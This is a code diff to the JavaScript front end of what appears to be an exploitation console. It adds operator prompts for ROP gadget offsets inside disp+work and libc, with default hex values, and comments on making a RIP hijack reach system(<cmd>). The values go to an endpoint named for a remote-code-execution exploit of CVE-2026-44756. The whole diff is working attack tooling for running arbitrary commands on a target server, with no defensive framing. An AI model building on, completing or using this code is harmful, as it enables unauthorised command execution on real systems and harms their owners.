@@ -8132,13 +8132,58 @@ async function ctxAction(action) {
           break;
         }
       }
+      // Optional gadget-offset overrides.  Julian's module defaults
+      // are kernel 7.93 PL101 + glibc 2.31; ANY other build (different
+      // kernel PL or different glibc) will hijack RIP correctly but
+      // land on a random middle-of-instruction byte and SIGSEGV
+      // immediately instead of reaching system(<cmd>).  When that
+      // happens, the delivery signature still reports "success"
+      // (connection dropped, 0 bytes reply) but nothing runs.
+      // Fix: run tools/cve-2026-44756/find_gadgets.py on the target
+      // to extract the per-build offsets and paste them in here.
+      const useOverride = confirm(
+        'Override gadget offsets for this target build?\n\n'
+        + 'Defaults are Julian\'s kernel 7.93 PL101 + glibc 2.31.  On '
+        + 'any other build you likely need per-target offsets or the '
+        + 'delivery will succeed on the wire but nothing runs (RIP '
+        + 'hijack lands on the wrong instruction and SIGSEGVs).\n\n'
+        + 'OK  = enter overrides now (recommended if you haven\'t '
+        + 'confirmed the target is exactly kernel 7.93 PL101).\n'
+        + 'Cancel = use defaults.\n\n'
+        + 'To extract the values, on the target:\n'
+        + '    python3 tools/cve-2026-44756/find_gadgets.py ' + sid);
+      let stage1_dw_off_hex = '';
+      let stage2_libc_off_hex = '';
+      let system_libc_off_hex = '';
+      if (useOverride) {
+        let v = prompt(
+          'STAGE1_DW_OFF (hex) — offset of\n'
+          + '    mov rdi,[rdx+0x10]; mov rax,[rdi]; call [rax+0x30]\n'
+          + 'inside disp+work.  Empty = use default (0x1dbd74e).', '');
+        if (v === null) break;
+        stage1_dw_off_hex = v.trim();
+        v = prompt(
+          'STAGE2_LIBC_OFF (hex) — offset of\n'
+          + '    mov rdi,[rdi+8]; jmp [rax]\n'
+          + 'inside libc.  Empty = use default (0x97dba).', '');
+        if (v === null) break;
+        stage2_libc_off_hex = v.trim();
+        v = prompt(
+          'SYSTEM_LIBC_OFF (hex) — file offset of __libc_system in\n'
+          + 'libc.  Empty = use default (0x58fae).', '');
+        if (v === null) break;
+        system_libc_off_hex = v.trim();
+      }
       const body = {
-        confirm:       true,
-        command:       command || defaultCmd,
-        dw_base_hex:   dw_base_hex,
-        libc_base_hex: libc_base_hex,
-        rdx_hex:       rdx_hex,
-        auto_capture:  true,
+        confirm:             true,
+        command:             command || defaultCmd,
+        dw_base_hex:         dw_base_hex,
+        libc_base_hex:       libc_base_hex,
+        rdx_hex:             rdx_hex,
+        auto_capture:        true,
+        stage1_dw_off_hex:   stage1_dw_off_hex,
+        stage2_libc_off_hex: stage2_libc_off_hex,
+        system_libc_off_hex: system_libc_off_hex,
       };
       await api('POST', `node/${sid}/exploit_cve_2026_44756_diag_rce`, body);
       break;
